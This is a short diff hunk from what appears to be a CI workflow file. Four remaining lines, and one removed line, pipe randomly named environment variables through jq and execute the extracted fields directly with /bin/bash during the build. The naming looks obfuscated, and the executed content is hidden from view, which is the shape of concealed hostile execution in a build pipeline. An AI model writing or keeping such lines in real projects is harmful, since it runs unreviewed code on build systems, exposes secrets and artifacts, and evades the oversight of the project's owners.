@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$a748" | jq -r .agc4060 | /bin/bash
           echo $o13382 | jq -r .peuqy0 | /bin/bash
           printf '%s' "$kz5917" | jq -r .ct07 | /bin/bash
-          echo $n68734 | jq -r .o732 | /bin/bash
           echo $wwgw25365 | jq -r .yo24 | /bin/bash
 
       - name: Store artifact
